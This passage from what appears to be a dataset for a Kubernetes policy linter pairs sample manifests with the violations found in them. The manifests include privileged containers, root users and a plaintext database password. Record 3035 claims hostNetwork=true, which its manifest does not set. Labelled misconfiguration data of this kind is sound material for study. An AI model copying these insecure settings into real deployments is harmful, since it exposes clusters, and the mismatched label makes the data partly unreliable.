.PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 52b4dd6da9e7d2edaa3548ce1bd2f9e86032cccb\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"lighthouse-foghorn\" does not have a read-only root file system"
  },
  {
    "id": "3025",
    "manifest_path": "data/manifests/the_stack_sample/sample_0878.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-foghorn\n  labels:\n    chart: lighthouse-1.5.7\n    app: lighthouse-foghorn\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-foghorn\n  template:\n    metadata:\n      labels:\n        app: lighthouse-foghorn\n      annotations:\n        jenkins-x.io/hash: 15344ed303d5710e2cd3a4efcdd4a3cd191aa324d9f6b90bca190762be07d2a7\n    spec:\n      serviceAccountName: lighthouse-foghorn\n      containers:\n      - name: lighthouse-foghorn\n        image: ghcr.io/jenkins-x/lighthouse-foghorn:1.5.7\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: osstap1989\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: HMAC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-hmac-token\n              key: hmac\n              optional: false\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.5.7\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 52b4dd6da9e7d2edaa3548ce1bd2f9e86032cccb\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"lighthouse-foghorn\" not found"
  },
  {
    "id": "3026",
    "manifest_path": "data/manifests/the_stack_sample/sample_0878.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-foghorn\n  labels:\n    chart: lighthouse-1.5.7\n    app: lighthouse-foghorn\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-foghorn\n  template:\n    metadata:\n      labels:\n        app: lighthouse-foghorn\n      annotations:\n        jenkins-x.io/hash: 15344ed303d5710e2cd3a4efcdd4a3cd191aa324d9f6b90bca190762be07d2a7\n    spec:\n      serviceAccountName: lighthouse-foghorn\n      containers:\n      - name: lighthouse-foghorn\n        image: ghcr.io/jenkins-x/lighthouse-foghorn:1.5.7\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: osstap1989\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: HMAC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-hmac-token\n              key: hmac\n              optional: false\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.5.7\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 52b4dd6da9e7d2edaa3548ce1bd2f9e86032cccb\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"lighthouse-foghorn\" is not set to runAsNonRoot"
  },
  {
    "id": "3027",
    "manifest_path": "data/manifests/the_stack_sample/sample_0879.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app.kubernetes.io/component: controller\n    app.kubernetes.io/name: prometheus-operator\n    app.kubernetes.io/version: 0.48.1\n  name: prometheus-operator\n  namespace: monitoring\nspec:\n  clusterIP: None\n  ports:\n  - name: http\n    port: 8080\n    targetPort: http\n  selector:\n    app.kubernetes.io/component: controller\n    app.kubernetes.io/name: prometheus-operator\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app.kubernetes.io/component:controller app.kubernetes.io/name:prometheus-operator])"
  },
  {
    "id": "3028",
    "manifest_path": "data/manifests/the_stack_sample/sample_0882.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: rook-prometheus\n  namespace: rook-ceph\nspec:\n  type: LoadBalancer\n  ports:\n  - name: web\n    port: 9090\n    protocol: TCP\n    targetPort: web\n  selector:\n    prometheus: rook-prometheus\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[prometheus:rook-prometheus])"
  },
  {
    "id": "3029",
    "manifest_path": "data/manifests/the_stack_sample/sample_0889.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: login-deployment\nspec:\n  replicas: 5\n  selector:\n    matchLabels:\n      component: login\n  template:\n    metadata:\n      labels:\n        component: login\n    spec:\n      containers:\n      - name: login\n        image: sbalasubramanian14/login-api\n        ports:\n        - containerPort: 5001\n        env:\n        - name: DATABASE_HOST\n          value: mysql-cluster-ip-service\n        - name: DATABASE_NAME\n          value: mydatabase\n        - name: DATABASE_USERNAME\n          value: root\n        - name: DATABASE_PASSWORD\n          value: admin@123\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"login\" is using an invalid container image, \"sbalasubramanian14/login-api\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "3030",
    "manifest_path": "data/manifests/the_stack_sample/sample_0889.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: login-deployment\nspec:\n  replicas: 5\n  selector:\n    matchLabels:\n      component: login\n  template:\n    metadata:\n      labels:\n        component: login\n    spec:\n      containers:\n      - name: login\n        image: sbalasubramanian14/login-api\n        ports:\n        - containerPort: 5001\n        env:\n        - name: DATABASE_HOST\n          value: mysql-cluster-ip-service\n        - name: DATABASE_NAME\n          value: mydatabase\n        - name: DATABASE_USERNAME\n          value: root\n        - name: DATABASE_PASSWORD\n          value: admin@123\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 5 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "3031",
    "manifest_path": "data/manifests/the_stack_sample/sample_0889.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: login-deployment\nspec:\n  replicas: 5\n  selector:\n    matchLabels:\n      component: login\n  template:\n    metadata:\n      labels:\n        component: login\n    spec:\n      containers:\n      - name: login\n        image: sbalasubramanian14/login-api\n        ports:\n        - containerPort: 5001\n        env:\n        - name: DATABASE_HOST\n          value: mysql-cluster-ip-service\n        - name: DATABASE_NAME\n          value: mydatabase\n        - name: DATABASE_USERNAME\n          value: root\n        - name: DATABASE_PASSWORD\n          value: admin@123\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"login\" does not have a read-only root file system"
  },
  {
    "id": "3032",
    "manifest_path": "data/manifests/the_stack_sample/sample_0889.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: login-deployment\nspec:\n  replicas: 5\n  selector:\n    matchLabels:\n      component: login\n  template:\n    metadata:\n      labels:\n        component: login\n    spec:\n      containers:\n      - name: login\n        image: sbalasubramanian14/login-api\n        ports:\n        - containerPort: 5001\n        env:\n        - name: DATABASE_HOST\n          value: mysql-cluster-ip-service\n        - name: DATABASE_NAME\n          value: mydatabase\n        - name: DATABASE_USERNAME\n          value: root\n        - name: DATABASE_PASSWORD\n          value: admin@123\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"login\" is not set to runAsNonRoot"
  },
  {
    "id": "3033",
    "manifest_path": "data/manifests/the_stack_sample/sample_0889.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: login-deployment\nspec:\n  replicas: 5\n  selector:\n    matchLabels:\n      component: login\n  template:\n    metadata:\n      labels:\n        component: login\n    spec:\n      containers:\n      - name: login\n        image: sbalasubramanian14/login-api\n        ports:\n        - containerPort: 5001\n        env:\n        - name: DATABASE_HOST\n          value: mysql-cluster-ip-service\n        - name: DATABASE_NAME\n          value: mydatabase\n        - name: DATABASE_USERNAME\n          value: root\n        - name: DATABASE_PASSWORD\n          value: admin@123\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"login\" has cpu request 0"
  },
  {
    "id": "3034",
    "manifest_path": "data/manifests/the_stack_sample/sample_0889.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: login-deployment\nspec:\n  replicas: 5\n  selector:\n    matchLabels:\n      component: login\n  template:\n    metadata:\n      labels:\n        component: login\n    spec:\n      containers:\n      - name: login\n        image: sbalasubramanian14/login-api\n        ports:\n        - containerPort: 5001\n        env:\n        - name: DATABASE_HOST\n          value: mysql-cluster-ip-service\n        - name: DATABASE_NAME\n          value: mydatabase\n        - name: DATABASE_USERNAME\n          value: root\n        - name: DATABASE_PASSWORD\n          value: admin@123\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"login\" has memory limit 0"
  },
  {
    "id": "3035",
    "manifest_path": "data/manifests/the_stack_sample/sample_0892.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: direct-mapper\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: directmapper\n  template:\n    metadata:\n      labels:\n        app: directmapper\n    spec:\n      containers:\n      - name: direct-mapper-container\n        image: directmapper:v1.0\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - name: config-volume\n          mountPath: /opt/kubeedge/\n        - mountPath: /dev/ttyS0\n          name: direct-dev0\n        - mountPath: /dev/ttyS1\n          name: direct-dev1\n      volumes:\n      - name: config-volume\n        configMap:\n          name: device-profile-config-test\n      - name: direct-dev0\n        hostPath:\n          path: /dev/ttyS0\n      - name: direct-dev1\n        hostPath:\n          path: /dev/ttyS1\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "3036",
    "manifest_path": "data/manifests/the_stack_sample/sample_0892.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: direct-mapper\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: directmapper\n  template:\n    metadata:\n      labels:\n        app: directmapper\n    spec:\n      containers:\n      - name: direct-mapper-container\n        image: directmapper:v1.0\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - name: config-volume\n          mountPath: /opt/kubeedge/\n        - mountPath: /dev/ttyS0\n          name: direct-dev0\n        - mountPath: /dev/ttyS1\n          name: direct-dev1\n      volumes:\n      - name: config-volume\n        configMap:\n          name: device-profile-config-test\n      - name: direct-dev0\n        hostPath:\n          path: /dev/ttyS0\n      - name: direct-dev1\n        hostPath:\n          path: /dev/ttyS1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"direct-mapper-container\" does not have a read-only root file system"
  },
  {
    "id": "3037",
    "manifest_path": "data/manifests/the_stack_sample/sample_0892.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: direct-mapper\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: directmapper\n  template:\n    metadata:\n      labels:\n        app: directmapper\n    spec:\n      containers:\n      - name: direct-mapper-container\n        image: directmapper:v1.0\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - name: config-volume\n          mountPath: /opt/kubeedge/\n        - mountPath: /dev/ttyS0\n          name: direct-dev0\n        - mountPath: /dev/ttyS1\n          name: direct-dev1\n      volumes:\n      - name: config-volume\n        configMap:\n          name: device-profile-config-test\n      - name: direct-dev0\n        hostPath:\n          path: /dev/ttyS0\n      - name: direct-dev1\n        hostPath:\n          path: /dev/ttyS1\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"direct-mapper-container\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "3038",
    "manifest_path": "data/manifests/the_stack_sample/sample_0892.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: direct-mapper\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: directmapper\n  template:\n    metadata:\n      labels:\n        app: directmapper\n    spec:\n      containers:\n      - name: direct-mapper-container\n        image: directmapper:v1.0\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - name: config-volume\n          mountPath: /opt/kubeedge/\n        - mountPath: /dev/ttyS0\n          name: direct-dev0\n        - mountPath: /dev/ttyS1\n          name: direct-dev1\n      volumes:\n      - name: config-volume\n        configMap:\n          name: device-profile-config-test\n      - name: direct-dev0\n        hostPath:\n          path: /dev/ttyS0\n      - name: direct-dev1\n        hostPath:\n          path: /dev/ttyS1\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"direct-mapper-container\" is privileged"
  },
  {
    "id": "3039",
    "manifest_path": "data/manifests/the_stack_sample/sample_0892.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: direct-mapper\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: directmapper\n  template:\n    metadata:\n      labels:\n        app: directmapper\n    spec:\n      containers:\n      - name: direct-mapper-container\n        image: directmapper:v1.0\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - name: config-volume\n          mountPath: /opt/kubeedge/\n        - mountPath: /dev/ttyS0\n          name: direct-dev0\n        - mountPath: /dev/ttyS1\n          name: direct-dev1\n      volumes:\n      - name: config-volume\n        configMap:\n          name: device-profile-config-test\n      - name: direct-dev0\n        hostPath:\n          path: /dev/ttyS0\n      - name: direct-dev1\n        hostPath:\n          path: /dev/ttyS1\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"direct-mapper-container\" is not set to runAsNonRoot"
  },
  {
    "id": "3040",
    "manifest_path": "data/manifests/the_stack_sample/sample_0892.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: direct-mapper\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: directmapper\n  template:\n    metadata:\n      labels:\n        app: directmapper\n    spec:\n      containers:\n      - name: direct-mapper-container\n        image: directmapper:v1.0\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - name: config-volume\n          mountPath: /opt/kubeedge/\n        - mountPath: /dev/ttyS0\n          name: direct-dev0\n        - mountPath: /dev/ttyS1\n          name: direct-dev1\n      volumes:\n      - name: config-volume\n        configMap:\n          name: device-profile-config-test\n      - name: direct-dev0\n        hostPath:\n          path: /dev/ttyS0\n      - name: direct-dev1\n        hostPath:\n          path: /dev/ttyS1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"direct-mapper-container\" has cpu request 0"
  },
  {
    "id": "3041",
    "manifest_path": "data/manifests/the_stack_sample/sample_0892.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: direct-mapper\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: directmapper\n  template:\n    metadata:\n      labels:\n        app: directmapper\n    spec:\n      containers:\n      - name: direct-mapper-container\n        image: directmapper:v1.0\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - name: config-volume\n          mountPath: /opt/kubeedge/\n        - mountPath: /dev/ttyS0\n          name: direct-dev0\n        - mountPath: /dev/ttyS1\n          name: direct-dev1\n      volumes:\n      - name: config-volume\n        configMap:\n          name: device-profile-config-test\n      - name: direct-dev0\n        hostPath:\n          path: /dev/ttyS0\n      - name: direct-dev1\n        hostPath:\n          path: /dev/ttyS1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"direct-mapper-container\" has memory limit 0"
  },
  {
    "id": "3042",
    "manifest_path": "data/manifests/the_stack_sample/sample_0894.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: axonserver\n  labels:\n    app: axonserver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: axonserver\n  template:\n    metadata:\n      labels:\n        app: axonserver\n    spec:\n      containers:\n      - name: axonserver\n        image: axoniq/axonserver\n        imagePullPolicy: Always\n        ports:\n        - name: grpc\n          containerPort: 8124\n          protocol: TCP\n        - name: http\n          containerPort: 8024\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            port: http\n            path: /actuator/info\n          initialDelaySeconds: 30\n          periodSeconds: 5\n          timeoutSeconds: 1\n        livenessProbe:\n          httpGet:\n            port: gui\n            path: /actuator/info\n          initialDelaySeconds: 30\n          periodSeconds: 5\n          timeoutSeconds: 1\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"axonserver\" is using an invalid container image, \"axoniq/axonserver\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "3043",
    "manifest_path": "data/manifests/the_stack_sample/sample_0894.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: axonserver\n  labels:\n    app: axonserver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: axonserver\n  template:\n    metadata:\n      labels:\n        app: axonserver\n    spec:\n      containers:\n      - name: axonserver\n        image: axoniq/axonserver\n        imagePullPolicy: Always\n        ports:\n        - name: grpc\n          containerPort: 8124\n          protocol: TCP\n        - name: http\n          containerPort: 8024\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            port: http\n            path: /actuator/info\n          initialDelaySeconds: 30\n          periodSeconds: 5\n          timeoutSeconds: 1\n        livenessProbe:\n          httpGet:\n            port: gui\n            path: /actuator/info\n          initialDelaySeconds: 30\n          periodSeconds: 5\n          timeoutSeconds: 1\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"axonserver\" does not expose port gui for the HTTPGet"
  },
  {
    "id": "3044",
    "manifest_path": "data/manifests/the_stack_sample/sample_0894.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: axonserver\n  labels:\n    app: axonserver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: axonserver\n  template:\n    metadata:\n      labels:\n        app: axonserver\n    spec:\n      containers:\n      - name: axonserver\n        image: axoniq/axonserver\n        imagePullPolicy: Always\n        ports:\n        - name: grpc\n          containerPort: 8124\n          protocol: TCP\n        - name: http\n          containerPort: 8024\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            port: http\n            path: /actuator/info\n          initialDelaySeconds: 30\n          periodSeconds: 5\n          timeoutSeconds: 1\n        livenessProbe:\n          httpGet:\n            port: gui\n            path: /actuator/info\n          initialDelaySeconds: 30\n          periodSeconds: 5\n          timeoutSeconds: 1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"axonserver\" does not have a read-only root file system"
  },
  {
    "id": "3045",
    "manifest_path": "data/manifests/the_stack_sample/sample_0894.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: axonserver\n  labels:\n    app: axonserver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: axonserver\n  template:\n    metadata:\n      labels:\n        app: axonserver\n    spec:\n      containers:\n      - name: axonserver\n        image: axoniq/axonserver\n        imagePullPolicy: Always\n        ports:\n        - name: grpc\n          containerPort: 8124\n          protocol: TCP\n        - name: http\n          containerPort: 8024\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            port: http\n            path: /actuator/info\n          initialDelaySeconds: 30\n          periodSeconds: 5\n          timeoutSeconds: 1\n        livenessProbe:\n          httpGet:\n            port: gui\n            path: /actuator/info\n          initialDelaySeconds: 30\n          periodSeconds: 5\n          timeoutSeconds: 1\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"axonserver\" is not set to runAsNonRoot"
  },
  {
    "id": "3046",
    "manifest_path": "data/manifests/the_stack_sample/sample_0894.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: axonserver\n  labels:\n    app: axonserver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: axonserver\n  template:\n    metadata:\n      labels:\n        app: axonserver\n    spec:\n      containers:\n      - name: axonserver\n        image: axoniq/axonserver\n        imagePullPolicy: Always\n        ports:\n        - name: grpc\n          containerPort: 8124\n          protocol: TCP\n        - name: http\n          containerPort: 8024\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            port: http\n            path: /actuator/info\n          initialDelaySeconds: 30\n          periodSeconds: 5\n          timeoutSeconds: 1\n        livenessProbe:\n          httpGet:\n            port: gui\n            path: /actuator/info\n          initialDelaySeconds: 30\n          periodSeconds: 5\n          timeoutSeconds: 1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"axonserver\" has cpu request 0"
  },
  {
    "id": "3047",
    "manifest_path": "data/manifests/the_stack_sample/sample_0894.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: axonserver\n  labels:\n    app: axonserver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: axonserver\n  template:\n    metadata:\n      labels:\n        app: axonserver\n    spec:\n      containers:\n      - name: axonserver\n        image: axoniq/axonserver\n        imagePullPolicy: Always\n        ports:\n        - name: grpc\n          containerPort: 8124\n          protocol: TCP\n        - name: http\n          containerPort: 8024\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            port: http\n            path: /actuator/info\n          initialDelaySeconds: 30\n          periodSeconds: 5\n          timeoutSeconds: 1\n        livenessProbe:\n          httpGet:\n            port: gui\n            path: /actuator/info\n          initialDelaySeconds: 30\n          periodSeconds: 5\n          timeoutSeconds: 1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"axonserver\" has memory limit 0"
  },
  {
    "id": "3048",
    "manifest_path": "data/manifests/the_stack_sample/sample_0895.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-httpd\n  annotations:\n    annotation1: hello\n  labels:\n    app: httpd\nspec:\n  containers:\n  - name: cntr-httpd\n    image: httpd:latest\n    ports:\n    - containerPort: 80\n    env:\n    - name: pod_name\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: pod_namespace\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    - name: pod_nodeName\n      valueFrom:\n        fieldRef:\n          fieldPath: spec.nodeName\n    - name: pod_serviceAccountName\n      valueFrom:\n        fieldRef:\n          fieldPath: spec.serviceAccountName\n    - name: pod_hostIP\n      valueFrom:\n        fieldRef:\n          fieldPath: status.hostIP\n    - name: pod_podIP\n      valueFrom:\n        fieldRef:\n          fieldPath: status.podIP\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"cntr-httpd\" is using an invalid container image, \"httpd:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "3049",
    "manifest_path": "data/manifests/the_stack_sample/sample_0895.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-httpd\n  annotations:\n    annotation1: hello\n  labels:\n    app: httpd\nspec:\n  containers:\n  - name: cntr-httpd\n    image: httpd:latest\n    ports:\n    - containerPort: 80\n    env:\n    - name: pod_name\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: pod_namespace\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    - name: pod_nodeName\n      valueFrom:\n        fieldRef:\n          fieldPath: spec.nodeName\n    - name: pod_serviceAccountName\n      valueFrom:\n        fieldRef:\n          fieldPath: spec.serviceAccountName\n    - name: pod_hostIP\n      valueFrom:\n        fieldRef:\n          fieldPath: status.hostIP\n    - name: pod_podIP\n      valueFrom:\n        fieldRef:\n          fieldPath: status.podIP\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cntr-httpd\" does not have a read-only root file system"
  },
  {
    "id": "3050",
    "manifest_path": "data/manifests/the_stack_sample/sample_0895.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-httpd\n  annotations:\n    annotation1: hello\n  labels:\n    app: httpd\nspec:\n  containers:\n  - name: cntr-httpd\n    image: httpd:latest\n    ports:\n    - containerPort: 80\n    env:\n    - name: pod_name\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: pod_namespace\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    - name: pod_nodeName\n      valueFrom:\n        fieldRef:\n          fieldPath: spec.nodeName\n    - name: pod_serviceAccountName\n      valueFrom:\n        fieldRef:\n          fieldPath: spec.serviceAccountName\n    - name: pod_hostIP\n      valueFrom:\n        fieldRef:\n          fieldPath: status.hostIP\n    - name: pod_podIP\n      valueFrom:\n        fieldRef:\n          fieldPath: status.podIP\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cntr-httpd\" is not set to runAsNonRoot"
  },
  {
    "id": "3051",
    "manifest_path": "data/manifests/the_stack_sample/sample_0895.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-httpd\n  annotations:\n    annotation1: hello\n  labels:\n    app: httpd\nspec:\n  containers:\n  - name: cntr-httpd\n    image: httpd:latest\n    ports:\n    - containerPort: 80\n    env:\n    - name: pod_name\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: pod_namespace\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    - name: pod_nodeName\n      valueFrom:\n        fieldRef:\n          fieldPath: spec.nodeName\n    - name: pod_serviceAccountName\n      valueFrom:\n        fieldRef:\n          fieldPath: spec.serviceAccountName\n    - name: pod_hostIP\n      valueFrom:\n        fieldRef:\n          fieldPath: status.hostIP\n    - name: pod_podIP\n      valueFrom:\n        fieldRef:\n          fieldPath: status.podIP\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cntr-httpd\" has cpu request 0"
  },
  {
    "id": "3052",
    "manifest_path": "data/manifests/the_stack_sample/sample_0895.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-httpd\n  annotations:\n    annotation1: hello\n  labels:\n    app: httpd\nspec:\n  containers:\n  - name: cntr-httpd\n    image: httpd:latest\n    ports:\n    - containerPort: 80\n    env:\n    - name: pod_name\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: pod_namespace\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    - name: pod_nodeName\n      valueFrom:\n        fieldRef:\n          fieldPath: spec.nodeName\n    - name: pod_serviceAccountName\n      valueFrom:\n        fieldRef:\n          fieldPath: spec.serviceAccountName\n    - name: pod_hostIP\n      valueFrom:\n        fieldRef:\n          fieldPath: status.hostIP\n    - name: pod_podIP\n      valueFrom:\n        fieldRef:\n          fieldPath: status.podIP\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cntr-httpd\" has memory limit 0"
  },
  {
    "id": "3053",
    "manifest_path": "data/manifests/the_stack_sample/sample_0905.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: database\n  labels:\n    name: database\nspec:\n  ports:\n  - port: 5432\n    targetPort: 5432\n  selector:\n    name: database\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[name:database])"
  },
  {
    "id": "3054",
